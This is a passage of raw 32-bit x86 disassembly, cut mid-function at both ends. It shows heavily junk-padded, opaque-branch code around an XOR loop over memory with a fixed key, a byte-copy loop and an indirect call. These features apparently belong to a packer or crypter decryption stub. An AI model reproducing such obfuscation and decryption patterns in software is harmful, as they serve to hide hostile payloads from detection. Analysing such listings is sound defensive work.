  41afd3:	mov    edi,DWORD PTR [ebp-0xc]
  41afd6:	mov    edx,DWORD PTR [ebp-0xc]
  41afd9:	sub    esi,ebx
  41afdb:	and    edx,ecx
  41afdd:	cmp    edi,0xffffffbd
  41afe0:	je     0x41b043
  41afe2:	sub    edi,edx
  41afe4:	mov    edx,DWORD PTR [ebp-0xc]
  41afe7:	test   edx,0xff
  41afed:	je     0x41b043
  41afef:	mov    ebx,DWORD PTR [ebp-0xc]
  41aff2:	add    edi,ebx
  41aff4:	add    esi,ebx
  41aff6:	add    DWORD PTR [ebp-0xc],ebx
  41aff9:	cmp    edx,0xffffffbf
  41affc:	je     0x41b043
  41affe:	mov    ebx,edi
  41b000:	mov    edi,DWORD PTR ds:0x459eb0
  41b006:	cmp    esi,DWORD PTR [ebp-0x1c]
  41b009:	je     0x41b043
  41b00b:	sub    DWORD PTR [ebp-0xc],edx
  41b00e:	sub    ebx,esi
  41b010:	cmp    esi,eax
  41b012:	jne    0x41b043
  41b014:	test   ebx,0xd
  41b01a:	je     0x41b043
  41b01c:	sub    DWORD PTR [ebp-0xc],edi
  41b01f:	test   esi,0x86
  41b025:	je     0x41b043
  41b027:	cmp    ebx,DWORD PTR ds:0x459ed8
  41b02d:	jne    0x41b043
  41b02f:	mov    edx,DWORD PTR ds:0x459efc
  41b035:	and    DWORD PTR [ebp-0xc],esi
  41b038:	mov    esi,edx
  41b03a:	add    DWORD PTR [ebp-0xc],eax
  41b03d:	sub    DWORD PTR [ebp-0xc],ebx
  41b040:	sub    DWORD PTR [ebp-0xc],esi
  41b043:	dec    DWORD PTR [ebp+0xc]
  41b046:	or     ebx,ecx
  41b048:	sub    ebx,eax
  41b04a:	add    DWORD PTR [ebp-0xc],ebx
  41b04d:	add    DWORD PTR [ecx],eax
  41b04f:	mov    edx,DWORD PTR [ebp-0xc]
  41b052:	mov    edi,DWORD PTR ds:0x459ed8
  41b058:	cmp    edx,DWORD PTR ds:0x459eb0
  41b05e:	je     0x41b08f
  41b060:	cmp    ecx,edx
  41b062:	je     0x41b08f
  41b064:	sub    edx,ecx
  41b066:	add    DWORD PTR [ebp-0xc],edx
  41b069:	mov    edx,0x7d00
  41b06e:	or     DWORD PTR [ebp-0xc],edx
  41b071:	sub    edi,eax
  41b073:	mov    edx,DWORD PTR [ebp-0xc]
  41b076:	cmp    edi,esi
  41b078:	jne    0x41b08f
  41b07a:	sub    edx,ebx
  41b07c:	xor    DWORD PTR [ebp-0xc],eax
  41b07f:	cmp    edx,esi
  41b081:	je     0x41b08f
  41b083:	test   eax,0x63
  41b088:	je     0x41b08f
  41b08a:	add    edi,edx
  41b08c:	add    DWORD PTR [ebp-0xc],edi
  41b08f:	xor    DWORD PTR [ecx],0x98475ff5
  41b095:	add    DWORD PTR [ebp-0xc],edi
  41b098:	add    ecx,0x4
  41b09b:	mov    edi,eax
  41b09d:	sub    edi,edx
  41b09f:	mov    edx,DWORD PTR [ebp-0xc]
  41b0a2:	xor    DWORD PTR [ebp-0xc],ecx
  41b0a5:	mov    DWORD PTR [ebp-0xc],edx
  41b0a8:	add    edi,edx
  41b0aa:	add    DWORD PTR [ebp-0xc],edi
  41b0ad:	jmp    0x41af74
  41b0b2:	mov    edx,DWORD PTR ds:0x459e64
  41b0b8:	mov    DWORD PTR [ebp-0xc],edx
  41b0bb:	mov    ebx,DWORD PTR ds:0x459efc
  41b0c1:	mov    ecx,DWORD PTR [ebp-0xc]
  41b0c4:	add    ecx,ebx
  41b0c6:	cmp    ecx,0x3f
  41b0c9:	je     0x41b0f1
  41b0cb:	mov    eax,DWORD PTR [ebp-0xc]
  41b0ce:	mov    edx,0xd6cd
  41b0d3:	add    ecx,ebx
  41b0d5:	add    ecx,ebx
  41b0d7:	add    DWORD PTR [ebp-0xc],eax
  41b0da:	cmp    ecx,edx
  41b0dc:	je     0x41b0f1
  41b0de:	mov    ebx,0xd1
  41b0e3:	mov    eax,DWORD PTR [ebp-0xc]
  41b0e6:	sub    eax,ecx
  41b0e8:	add    DWORD PTR [ebp-0xc],eax
  41b0eb:	add    DWORD PTR [ebp-0xc],ebx
  41b0ee:	add    DWORD PTR [ebp-0xc],edx
  41b0f1:	add    DWORD PTR [ebp-0xc],ebx
  41b0f4:	pop    edi
  41b0f5:	sub    DWORD PTR [ebp-0xc],eax
  41b0f8:	pop    esi
  41b0f9:	sub    ebx,eax
  41b0fb:	mov    ecx,DWORD PTR [ebp-0xc]
  41b0fe:	add    ecx,ecx
  41b100:	mov    edx,DWORD PTR [ebp-0xc]
  41b103:	sub    DWORD PTR [ebp-0xc],edx
  41b106:	cmp    edi,DWORD PTR [ebp-0x20]
  41b109:	jne    0x41b1be
  41b10f:	sub    DWORD PTR [ebp-0xc],edi
  41b112:	and    ecx,eax
  41b114:	mov    edx,DWORD PTR [ebp-0xc]
  41b117:	mov    eax,DWORD PTR [ebp-0xc]
  41b11a:	test   ebx,0x99
  41b120:	jne    0x41b1be
  41b126:	cmp    edx,esi
  41b128:	jne    0x41b1be
  41b12e:	test   edi,0x2108100c
  41b134:	je     0x41b1be
  41b13a:	add    edx,ebx
  41b13c:	cmp    esi,ecx
  41b13e:	je     0x41b1be
  41b140:	cmp    esi,DWORD PTR [ebp-0x18]
  41b143:	je     0x41b1be
  41b145:	mov    ebx,DWORD PTR [ebp-0xc]
  41b148:	sub    DWORD PTR [ebp-0xc],eax
  41b14b:	mov    eax,DWORD PTR [ebp-0xc]
  41b14e:	sub    ebx,eax
  41b150:	cmp    ebx,DWORD PTR ds:0x459efc
  41b156:	jne    0x41b1be
  41b158:	add    ebx,eax
  41b15a:	mov    eax,DWORD PTR [ebp-0xc]
  41b15d:	or     eax,ebx
  41b15f:	mov    ebx,DWORD PTR [ebp-0xc]
  41b162:	add    DWORD PTR [ebp-0xc],esi
  41b165:	sub    edx,edi
  41b167:	sub    ebx,edx
  41b169:	cmp    ecx,DWORD PTR [ebp-0x28]
  41b16c:	je     0x41b1be
  41b16e:	sub    DWORD PTR [ebp-0xc],eax
  41b171:	mov    edx,DWORD PTR [ebp-0xc]
  41b174:	sub    ecx,ebx
  41b176:	sub    ecx,edx
  41b178:	cmp    ecx,edi
  41b17a:	jne    0x41b1be
  41b17c:	sub    ecx,eax
  41b17e:	mov    eax,DWORD PTR ds:0x459e60
  41b184:	sub    eax,esi
  41b186:	add    DWORD PTR [ebp-0xc],eax
  41b189:	cmp    ecx,DWORD PTR ds:0x459ed8
  41b18f:	je     0x41b1be
  41b191:	mov    edx,DWORD PTR [ebp-0xc]
  41b194:	sub    ecx,edx
  41b196:	test   eax,0xb8
  41b19b:	jne    0x41b1be
  41b19d:	mov    eax,0xbe
  41b1a2:	and    DWORD PTR [ebp-0xc],esi
  41b1a5:	sub    ecx,ebx
  41b1a7:	or     eax,esi
  41b1a9:	mov    DWORD PTR [ebp-0xc],eax
  41b1ac:	mov    eax,0xa1
  41b1b1:	add    eax,edi
  41b1b3:	add    DWORD PTR [ebp-0xc],eax
  41b1b6:	cmp    ecx,0xffffffc7
  41b1b9:	je     0x41b1be
  41b1bb:	add    DWORD PTR [ebp-0xc],ecx
  41b1be:	pop    ebx
  41b1bf:	cmp    ebx,0xffffffb7
  41b1c2:	jne    0x41b22f
  41b1c4:	mov    edx,DWORD PTR [ebp-0xc]
  41b1c7:	and    edx,edi
  41b1c9:	sub    edx,esi
  41b1cb:	and    edx,ebx
  41b1cd:	mov    eax,DWORD PTR [ebp-0xc]
  41b1d0:	add    edx,ebx
  41b1d2:	sub    edx,ebx
  41b1d4:	cmp    edx,eax
  41b1d6:	je     0x41b22f
  41b1d8:	mov    ecx,DWORD PTR [ebp-0xc]
  41b1db:	sub    eax,edx
  41b1dd:	cmp    eax,0xffffffdd
  41b1e0:	jne    0x41b22f
  41b1e2:	mov    edx,DWORD PTR ds:0x459ef4
  41b1e8:	cmp    eax,DWORD PTR ds:0x459e64
  41b1ee:	je     0x41b22f
  41b1f0:	add    eax,edi
  41b1f2:	sub    ecx,ebx
  41b1f4:	add    DWORD PTR [ebp-0xc],ecx
  41b1f7:	sub    edx,edi
  41b1f9:	mov    ecx,esi
  41b1fb:	add    edx,ebx
  41b1fd:	sub    DWORD PTR [ebp-0xc],eax
  41b200:	sub    ecx,eax
  41b202:	and    edx,esi
  41b204:	sub    DWORD PTR [ebp-0xc],ecx
  41b207:	cmp    edx,DWORD PTR [ebp-0x18]
  41b20a:	jne    0x41b22f
  41b20c:	mov    ecx,0x5b400142
  41b211:	test   edx,0xa1080540
  41b217:	je     0x41b22f
  41b219:	mov    ecx,DWORD PTR [ebp-0xc]
  41b21c:	sub    edx,eax
  41b21e:	mov    eax,DWORD PTR [ebp-0xc]
  41b221:	or     ecx,ebx
  41b223:	add    edx,eax
  41b225:	sub    edx,ecx
  41b227:	cmp    edx,0xfffffffc
  41b22a:	jne    0x41b22f
  41b22c:	xor    DWORD PTR [ebp-0xc],edx
  41b22f:	leave  
  41b230:	ret    0xc
  41b233:	int3   
  41b234:	int3   
  41b235:	int3   
  41b236:	int3   
  41b237:	int3   
  41b238:	push   ebp
  41b239:	mov    ebp,esp
  41b23b:	sub    esp,0x50
  41b23e:	mov    eax,0x48
  41b243:	mov    ecx,eax
  41b245:	mov    DWORD PTR [ebp-0x10],eax
  41b248:	sub    DWORD PTR [ebp-0x10],eax
  41b24b:	add    DWORD PTR [ebp-0x10],ecx
  41b24e:	push   ebx
  41b24f:	mov    eax,DWORD PTR [ebp-0x10]
  41b252:	sub    eax,ecx
  41b254:	or     eax,ecx
  41b256:	mov    edx,0x47
  41b25b:	add    edx,ecx
  41b25d:	mov    DWORD PTR [ebp-0x10],edx
  41b260:	cmp    eax,0x5c
  41b263:	je     0x41b268
  41b265:	mov    DWORD PTR [ebp-0x10],eax
  41b268:	push   esi
  41b269:	add    DWORD PTR [ebp-0x10],ecx
  41b26c:	push   edi
  41b26d:	or     DWORD PTR [ebp-0x10],ecx
  41b270:	mov    ecx,0x22
  41b275:	add    eax,eax
  41b277:	add    DWORD PTR [ebp-0x10],eax
  41b27a:	mov    DWORD PTR [ebp-0x10],ecx
  41b27d:	mov    ecx,0x98c473b3
  41b282:	add    DWORD PTR [ebp-0x10],ecx
  41b285:	sub    ecx,0x98c47373
  41b28b:	mov    edi,DWORD PTR [ebp-0x10]
  41b28e:	mov    edx,DWORD PTR [ebp-0x10]
  41b291:	sub    edi,edx
  41b293:	add    edi,edx
  41b295:	add    DWORD PTR [ebp-0x10],ecx
  41b298:	sub    edi,ecx
  41b29a:	and    edi,ecx
  41b29c:	add    DWORD PTR [ebp-0x10],edi
  41b29f:	push   ecx
  41b2a0:	mov    eax,DWORD PTR [ebp-0x10]
  41b2a3:	sub    DWORD PTR [ebp-0x10],eax
  41b2a6:	mov    ebx,0x2295e8ab
  41b2ab:	add    edx,ebx
  41b2ad:	mov    eax,DWORD PTR [ebp-0x10]
  41b2b0:	sub    eax,edx
  41b2b2:	mov    edi,DWORD PTR [ebp-0x10]
  41b2b5:	and    eax,ebx
  41b2b7:	add    DWORD PTR [ebp-0x10],eax
  41b2ba:	cmp    edi,0xfffffffa
  41b2bd:	je     0x41b2c2
  41b2bf:	sub    DWORD PTR [ebp-0x10],edi
  41b2c2:	add    ebx,0xdd6a2755
  41b2c8:	mov    edx,DWORD PTR ds:0x459ec8
  41b2ce:	mov    eax,DWORD PTR [ebp-0x10]
  41b2d1:	sub    eax,edx
  41b2d3:	cmp    eax,DWORD PTR [ebp-0x18]
  41b2d6:	jne    0x41b2f1
  41b2d8:	cmp    eax,edx
  41b2da:	jne    0x41b2f1
  41b2dc:	cmp    eax,0x4d
  41b2df:	jne    0x41b2f1
  41b2e1:	sub    eax,edx
  41b2e3:	mov    ecx,DWORD PTR [ebp-0x10]
  41b2e6:	or     ecx,eax
  41b2e8:	mov    edx,DWORD PTR [ebp-0x10]
  41b2eb:	add    DWORD PTR [ebp-0x10],edx
  41b2ee:	sub    DWORD PTR [ebp-0x10],ecx
  41b2f1:	push   ebx
  41b2f2:	mov    ecx,DWORD PTR [ebp-0x10]
  41b2f5:	cmp    ecx,0x73
  41b2f8:	jne    0x41b388
  41b2fe:	sub    ecx,edi
  41b300:	and    ecx,ebx
  41b302:	mov    esi,0xf
  41b307:	mov    esi,0xb4
  41b30c:	and    esi,eax
  41b30e:	cmp    edi,edx
  41b310:	je     0x41b388
  41b312:	add    esi,ecx
  41b314:	and    esi,ecx
  41b316:	mov    eax,DWORD PTR [ebp-0x10]
  41b319:	cmp    eax,0x54
  41b31c:	jne    0x41b388
  41b31e:	mov    edi,DWORD PTR [ebp-0x10]
  41b321:	sub    esi,eax
  41b323:	mov    edx,DWORD PTR [ebp-0x10]
  41b326:	cmp    esi,DWORD PTR [ebp-0x50]
  41b329:	jne    0x41b388
  41b32b:	and    edx,ecx
  41b32d:	cmp    esi,DWORD PTR [ebp-0x50]
  41b330:	je     0x41b388
  41b332:	test   edi,0xbfd5
  41b338:	je     0x41b388
  41b33a:	add    edi,eax
  41b33c:	and    edx,ecx
  41b33e:	mov    eax,DWORD PTR [ebp-0x10]
  41b341:	mov    ecx,DWORD PTR ds:0x459ef8
  41b347:	sub    eax,ebx
  41b349:	sub    DWORD PTR [ebp-0x10],esi
  41b34c:	cmp    eax,0x43
  41b34f:	jne    0x41b388
  41b351:	or     DWORD PTR [ebp-0x10],edi
  41b354:	sub    ecx,edx
  41b356:	sub    eax,edx
  41b358:	test   eax,0xaa81
  41b35d:	je     0x41b388
  41b35f:	mov    ebx,DWORD PTR ds:0x459ef8
  41b365:	sub    DWORD PTR [ebp-0x10],eax
  41b368:	sub    DWORD PTR [ebp-0x10],ecx
  41b36b:	cmp    edi,esi
  41b36d:	jne    0x41b388
  41b36f:	mov    edi,DWORD PTR [ebp-0x10]
  41b372:	and    DWORD PTR [ebp-0x10],ebx
  41b375:	mov    edx,DWORD PTR [ebp-0x10]
  41b378:	sub    DWORD PTR [ebp-0x10],edx
  41b37b:	add    edi,esi
  41b37d:	cmp    ecx,DWORD PTR [ebp-0x4c]
  41b380:	je     0x41b388
  41b382:	sub    DWORD PTR [ebp-0x10],eax
  41b385:	sub    DWORD PTR [ebp-0x10],edi
  41b388:	push   0x5d47c
  41b38d:	mov    eax,DWORD PTR [ebp-0x10]
  41b390:	mov    edx,DWORD PTR [ebp-0x10]
  41b393:	sub    eax,edx
  41b395:	cmp    eax,esi
  41b397:	jne    0x41b3d5
  41b399:	cmp    eax,0xffffff80
  41b39c:	je     0x41b3d5
  41b39e:	add    eax,ebx
  41b3a0:	mov    ebx,ecx
  41b3a2:	mov    esi,ecx
  41b3a4:	sub    eax,edx
  41b3a6:	and    eax,ebx
  41b3a8:	sub    eax,esi
  41b3aa:	cmp    edi,DWORD PTR ds:0x459ef8
  41b3b0:	jne    0x41b3d5
  41b3b2:	add    eax,eax
  41b3b4:	and    eax,ebx
  41b3b6:	sub    eax,ecx
  41b3b8:	mov    edx,0xe3
  41b3bd:	mov    edi,0x9
  41b3c2:	sub    DWORD PTR [ebp-0x10],esi
  41b3c5:	add    DWORD PTR [ebp-0x10],eax
  41b3c8:	or     DWORD PTR [ebp-0x10],edi
  41b3cb:	add    ecx,edx
  41b3cd:	or     ecx,edi
  41b3cf:	add    DWORD PTR [ebp-0x10],esi
  41b3d2:	mov    DWORD PTR [ebp-0x10],ecx
  41b3d5:	push   0x0
  41b3d7:	cmp    eax,0x41
  41b3da:	je     0x41b3f6
  41b3dc:	and    ebx,edx
  41b3de:	mov    edi,DWORD PTR [ebp-0x10]
  41b3e1:	sub    DWORD PTR [ebp-0x10],ebx
  41b3e4:	or     edi,ebx
  41b3e6:	sub    DWORD PTR [ebp-0x10],ecx
  41b3e9:	mov    esi,0x19
  41b3ee:	sub    edi,edx
  41b3f0:	add    DWORD PTR [ebp-0x10],edi
  41b3f3:	xor    DWORD PTR [ebp-0x10],esi
  41b3f6:	mov    edx,0xb314bd6e
  41b3fb:	and    ebx,esi
  41b3fd:	mov    edi,esi
  41b3ff:	mov    ecx,edi
  41b401:	add    DWORD PTR [ebp-0x10],ecx
  41b404:	add    ebx,eax
  41b406:	and    ebx,esi
  41b408:	sub    DWORD PTR [ebp-0x10],ebx
  41b40b:	sub    edx,0xb2cf1836
  41b411:	mov    ecx,eax
  41b413:	test   ecx,0x4c05
  41b419:	je     0x41b459
  41b41b:	sub    ecx,edi
  41b41d:	mov    edi,DWORD PTR [ebp-0x10]
  41b420:	add    DWORD PTR [ebp-0x10],ecx
  41b423:	mov    ebx,0x9cfa
  41b428:	sub    DWORD PTR [ebp-0x10],edx
  41b42b:	add    ebx,eax
  41b42d:	or     DWORD PTR [ebp-0x10],ebx
  41b430:	add    edi,edx
  41b432:	sub    DWORD PTR [ebp-0x10],esi
  41b435:	add    edi,eax
  41b437:	cmp    edi,0xffffffad
  41b43a:	je     0x41b459
  41b43c:	test   edi,0x82
  41b442:	je     0x41b459
  41b444:	mov    ecx,DWORD PTR ds:0x459ef8
  41b44a:	mov    ebx,DWORD PTR [ebp-0x10]
  41b44d:	add    DWORD PTR [ebp-0x10],ebx
  41b450:	and    edi,ecx
  41b452:	add    edi,edx
  41b454:	sub    edi,ecx
  41b456:	and    DWORD PTR [ebp-0x10],edi
  41b459:	call   DWORD PTR [edx]
  41b45b:	add    esi,ebx
  41b45d:	or     esi,ebx
  41b45f:	and    esi,edi
  41b461:	mov    edx,DWORD PTR [ebp-0x10]
  41b464:	mov    ebx,DWORD PTR ds:0x459ef8
  41b46a:	add    DWORD PTR [ebp-0x10],edx
  41b46d:	mov    DWORD PTR [ebp-0x24],esi
  41b470:	add    ebx,edx
  41b472:	add    ebx,esi
  41b474:	sub    DWORD PTR [ebp-0x10],ebx
  41b477:	mov    DWORD PTR [ebp-0x2c],eax
  41b47a:	sub    DWORD PTR [ebp-0x10],esi
  41b47d:	mov    eax,0xb82dcee2
  41b482:	or     esi,edx
  41b484:	or     DWORD PTR [ebp-0x10],eax
  41b487:	mov    ebx,0xfe
  41b48c:	sub    DWORD PTR [ebp-0x24],ebx
  41b48f:	mov    DWORD PTR [ebp-0x24],esi
  41b492:	add    eax,0x4813c60a
  41b497:	mov    edi,DWORD PTR [ebp-0x10]
  41b49a:	or     edi,esi
  41b49c:	mov    esi,DWORD PTR [ebp-0x24]
  41b49f:	sub    DWORD PTR [ebp-0x24],edx
  41b4a2:	add    DWORD PTR [ebp-0x24],edx
  41b4a5:	sub    esi,ebx
  41b4a7:	add    edi,edi
  41b4a9:	sub    DWORD PTR [ebp-0x10],eax
  41b4ac:	test   edi,0x8551
  41b4b2:	jne    0x41b5b0
  41b4b8:	mov    edx,DWORD PTR [ebp-0x24]
  41b4bb:	mov    ecx,ebx
  41b4bd:	cmp    edx,0x488
  41b4c3:	je     0x41b5b0
  41b4c9:	cmp    esi,DWORD PTR ds:0x459ef8
  41b4cf:	je     0x41b5b0
  41b4d5:	cmp    edx,esi
  41b4d7:	je     0x41b5b0
  41b4dd:	sub    ecx,edx
  41b4df:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4e2:	mov    edx,DWORD PTR ds:0x459ec8
  41b4e8:	cmp    ebx,0x35
  41b4eb:	je     0x41b5b0
  41b4f1:	add    DWORD PTR [ebp-0x24],edx
  41b4f4:	and    ebx,edi
  41b4f6:	add    DWORD PTR [ebp-0x10],ecx
  41b4f9:	cmp    esi,0x11
  41b4fc:	jne    0x41b5b0
  41b502:	add    ebx,edx
  41b504:	and    ebx,edi
  41b506:	mov    ecx,0x46
  41b50b:	mov    edi,DWORD PTR [ebp-0x24]
  41b50e:	sub    DWORD PTR [ebp-0x10],esi
  41b511:	sub    edi,ebx
  41b513:	cmp    edi,0x48d4
  41b519:	jne    0x41b5b0
  41b51f:	mov    edx,0xf1
  41b524:	cmp    edi,DWORD PTR ds:0x459ec8
  41b52a:	jne    0x41b5b0
  41b530:	sub    DWORD PTR [ebp-0x10],ebx
  41b533:	cmp    edi,DWORD PTR [ebp-0x50]
  41b536:	jne    0x41b5b0
  41b538:	sub    edx,ecx
  41b53a:	mov    ecx,DWORD PTR ds:0x459e68
  41b540:	cmp    esi,DWORD PTR [ebp-0x38]
  41b543:	jne    0x41b5b0
  41b545:	mov    ebx,DWORD PTR [ebp-0x24]
  41b548:	mov    esi,DWORD PTR [ebp-0x10]
  41b54b:	cmp    edi,DWORD PTR ds:0x459ef8
  41b551:	jne    0x41b5b0
  41b553:	sub    DWORD PTR [ebp-0x10],ecx
  41b556:	add    DWORD PTR [ebp-0x10],ecx
  41b559:	test   edi,0x7f
  41b55f:	je     0x41b5b0
  41b561:	and    DWORD PTR [ebp-0x10],ecx
  41b564:	add    ebx,edx
  41b566:	cmp    esi,0x2
  41b569:	je     0x41b5b0
  41b56b:	mov    edx,DWORD PTR [ebp-0x10]
  41b56e:	sub    esi,edi
  41b570:	add    DWORD PTR [ebp-0x24],eax
  41b573:	cmp    esi,ecx
  41b575:	je     0x41b5b0
  41b577:	mov    edi,DWORD PTR [ebp-0x24]
  41b57a:	mov    ecx,ebx
  41b57c:	sub    ecx,edi
  41b57e:	and    ecx,edx
  41b580:	mov    DWORD PTR [ebp-0x24],ecx
  41b583:	add    esi,eax
  41b585:	cmp    esi,ebx
  41b587:	jne    0x41b5b0
  41b589:	sub    esi,ecx
  41b58b:	mov    ecx,0x17db
  41b590:	mov    edi,DWORD PTR [ebp-0x10]
  41b593:	sub    esi,ebx
  41b595:	add    esi,eax
  41b597:	cmp    edi,DWORD PTR ds:0x459ec8
  41b59d:	jne    0x41b5b0
  41b59f:	cmp    edi,DWORD PTR ds:0x459ec8
  41b5a5:	je     0x41b5b0
  41b5a7:	and    DWORD PTR [ebp-0x10],ecx
  41b5aa:	sub    DWORD PTR [ebp-0x10],esi
  41b5ad:	sub    DWORD PTR [ebp-0x24],edi
  41b5b0:	mov    DWORD PTR [ebp-0x40],eax
  41b5b3:	sub    DWORD PTR [ebp-0x24],ebx
  41b5b6:	mov    edi,DWORD PTR [ebp-0x2c]
  41b5b9:	cmp    edi,0xffffffcc
  41b5bc:	jne    0x41b5c9
  41b5be:	cmp    edi,0x534f
  41b5c4:	jne    0x41b5c9
  41b5c6:	sub    DWORD PTR [ebp-0x10],edi
  41b5c9:	mov    esi,DWORD PTR ds:0x459e68
  41b5cf:	mov    ecx,0xfb
  41b5d4:	add    DWORD PTR [ebp-0x24],esi
  41b5d7:	add    DWORD PTR [ebp-0x10],edi
  41b5da:	mov    DWORD PTR [ebp-0x28],ecx
  41b5dd:	mov    edx,DWORD PTR [ebp-0x40]
  41b5e0:	and    eax,ecx
  41b5e2:	and    eax,ecx
  41b5e4:	sub    DWORD PTR [ebp-0x28],edx
  41b5e7:	mov    esi,DWORD PTR [ebp-0x10]
  41b5ea:	mov    ecx,edx
  41b5ec:	sub    esi,ecx
  41b5ee:	xor    DWORD PTR [ebp-0x10],eax
  41b5f1:	and    DWORD PTR [ebp-0x28],esi
  41b5f4:	mov    esi,DWORD PTR [edx]
  41b5f6:	sub    ebx,eax
  41b5f8:	mov    ecx,DWORD PTR [ebp-0x24]
  41b5fb:	mov    DWORD PTR [ebp-0x10],edx
  41b5fe:	add    ebx,edx
  41b600:	test   ecx,0x52d
  41b606:	je     0x41b616
  41b608:	add    DWORD PTR [ebp-0x10],edi
  41b60b:	add    DWORD PTR [ebp-0x28],esi
  41b60e:	or     ebx,ecx
  41b610:	sub    DWORD PTR [ebp-0x10],edi
  41b613:	add    DWORD PTR [ebp-0x28],ebx
  41b616:	mov    ecx,DWORD PTR [edx+0x4]
  41b619:	mov    edx,DWORD PTR [ebp-0x10]
  41b61c:	add    DWORD PTR [ebp-0x28],ecx
  41b61f:	or     DWORD PTR [ebp-0x28],edx
  41b622:	or     esi,esi
  41b624:	je     0x41b680
  41b626:	sub    DWORD PTR [ebp-0x28],edx
  41b629:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b62b:	mov    edx,0x76
  41b630:	test   edi,0x92
  41b636:	jne    0x41b674
  41b638:	or     esi,ebx
  41b63a:	add    ecx,eax
  41b63c:	sub    DWORD PTR [ebp-0x10],ecx
  41b63f:	cmp    esi,edi
  41b641:	je     0x41b674
  41b643:	mov    edx,DWORD PTR ds:0x459ef8
  41b649:	mov    ecx,0xb190
  41b64e:	sub    DWORD PTR [ebp-0x24],ecx
  41b651:	sub    DWORD PTR [ebp-0x24],edi
  41b654:	sub    edx,ecx
  41b656:	cmp    esi,DWORD PTR ds:0x459ec8
  41b65c:	jne    0x41b674
  41b65e:	add    esi,eax
  41b660:	mov    ecx,DWORD PTR ds:0x459e68
  41b666:	mov    DWORD PTR [ebp-0x48],edx
  41b669:	add    DWORD PTR [ebp-0x48],ecx
  41b66c:	cmp    esi,DWORD PTR [ebp-0x14]
  41b66f:	je     0x41b674
  41b671:	sub    DWORD PTR [ebp-0x28],esi
  41b674:	add    DWORD PTR [ebp-0x40],0x8
  41b678:	mov    DWORD PTR [ebp-0x3c],eax
  41b67b:	jmp    0x41b5b9
  41b680:	add    eax,edi
  41b682:	mov    edx,DWORD PTR ds:0x459e80
  41b688:	add    eax,eax
  41b68a:	sub    DWORD PTR [ebp-0x24],eax
  41b68d:	add    edx,edx
  41b68f:	mov    edi,esi
  41b691:	or     DWORD PTR [ebp-0x3c],ecx
  41b694:	sub    edi,edx
  41b696:	and    edi,eax
  41b698:	add    edi,ecx
  41b69a:	add    DWORD PTR [ebp-0x3c],edx
  41b69d:	sub    edi,ecx
  41b69f:	cmp    edi,DWORD PTR [ebp-0x30]
  41b6a2:	jne    0x41b732
  41b6a8:	cmp    esi,eax
  41b6aa:	je     0x41b732
  41b6b0:	mov    eax,DWORD PTR [ebp-0x10]
  41b6b3:	mov    ebx,0x4a
  41b6b8:	sub    DWORD PTR [ebp-0x10],ebx
  41b6bb:	add    eax,ecx
  41b6bd:	and    edi,ecx
  41b6bf:	sub    DWORD PTR [ebp-0x3c],eax
  41b6c2:	and    edi,ecx
  41b6c4:	test   edi,0xfd41
  41b6ca:	jne    0x41b732
  41b6cc:	mov    eax,0x78
  41b6d1:	add    DWORD PTR [ebp-0x28],edi
  41b6d4:	sub    eax,esi
  41b6d6:	sub    eax,ebx
  41b6d8:	cmp    eax,0x11
  41b6db:	jne    0x41b732
  41b6dd:	mov    esi,DWORD PTR [ebp-0x3c]
  41b6e0:	mov    ecx,0xbf
  41b6e5:	cmp    esi,0xffffffd6
  41b6e8:	je     0x41b732
  41b6ea:	mov    edx,ebx
  41b6ec:	sub    edx,ebx
  41b6ee:	mov    ebx,edx
  41b6f0:	and    ebx,esi
  41b6f2:	cmp    eax,0xd7f8
  41b6f7:	jne    0x41b732
  41b6f9:	mov    esi,DWORD PTR [ebp-0x24]
  41b6fc:	mov    edi,0xf3
  41b701:	sub    DWORD PTR [ebp-0x24],eax
  41b704:	add    edi,ebx
  41b706:	add    DWORD PTR [ebp-0x10],esi
  41b709:	cmp    edi,DWORD PTR ds:0x459e68
  41b70f:	jne    0x41b732
  41b711:	cmp    edi,edx
  41b713:	je     0x41b732
  41b715:	sub    edi,ecx
  41b717:	sub    edi,edx
  41b719:	cmp    edi,DWORD PTR ds:0x459e68
  41b71f:	jne    0x41b732
  41b721:	test   edi,0x93
  41b727:	jne    0x41b732
  41b729:	mov    esi,DWORD PTR [ebp-0x24]
  41b72c:	or     DWORD PTR [ebp-0x24],edi
  41b72f:	sub    DWORD PTR [ebp-0x10],esi
  41b732:	mov    ecx,DWORD PTR ds:0x459e84
  41b738:	or     ecx,eax
  41b73a:	cmp    ecx,ebx
  41b73c:	je     0x41b741
  41b73e:	add    DWORD PTR [ebp-0x28],ecx
  41b741:	mov    eax,DWORD PTR [ebp-0x2c]
  41b744:	sub    edx,ebx
  41b746:	sub    DWORD PTR [ebp-0x28],edx
  41b749:	xor    DWORD PTR [ebp-0x10],eax
  41b74c:	pop    edi
  41b74d:	mov    ebx,ecx
  41b74f:	cmp    ebx,0x43
  41b752:	jne    0x41b75d
  41b754:	cmp    edi,ecx
  41b756:	je     0x41b75d
  41b758:	sub    ebx,edi
  41b75a:	sub    DWORD PTR [ebp-0x28],ebx
  41b75d:	pop    esi
  41b75e:	add    DWORD PTR [ebp-0x3c],esi
  41b761:	pop    ebx
  41b762:	add    edx,eax
  41b764:	add    edx,ebx
  41b766:	mov    ecx,DWORD PTR [ebp-0x10]
  41b769:	sub    DWORD PTR [ebp-0x3c],ebx
  41b76c:	sub    DWORD PTR [ebp-0x10],ecx
  41b76f:	add    DWORD PTR [ebp-0x24],edx
  41b772:	leave  
  41b773:	ret    
  41b774:	int3   
  41b775:	int3   
  41b776:	int3   
  41b777:	int3   
  41b778:	int3   
  41b779:	push   ebp
  41b77a:	mov    ebp,esp
  41b77c:	sub    esp,0x1c
  41b77f:	mov    ecx,0x42
  41b784:	add    ecx,ecx
  41b786:	mov    DWORD PTR [ebp-0x4],ecx
  41b789:	push   ebx
  41b78a:	mov    ebx,DWORD PTR [ebp-0x4]
  41b78d:	mov    ecx,0x37
  41b792:	add    ebx,ebx
  41b794:	add    ebx,ecx
  41b796:	sub    ebx,ecx
  41b798:	sub    DWORD PTR [ebp-0x4],ebx
  41b79b:	push   esi
  41b79c:	add    DWORD PTR [ebp-0x4],ebx
  41b79f:	push   edi
  41b7a0:	sub    ecx,ebx
  41b7a2:	cmp    ecx,ebx
  41b7a4:	je     0x41b7bf
  41b7a6:	mov    esi,DWORD PTR [ebp-0x4]
  41b7a9:	mov    edx,DWORD PTR ds:0x459f08
  41b7af:	add    DWORD PTR [ebp-0x4],ecx
  41b7b2:	add    DWORD PTR [ebp-0x4],esi
  41b7b5:	sub    edx,ecx
  41b7b7:	or     edx,esi
  41b7b9:	and    DWORD PTR [ebp-0x4],esi
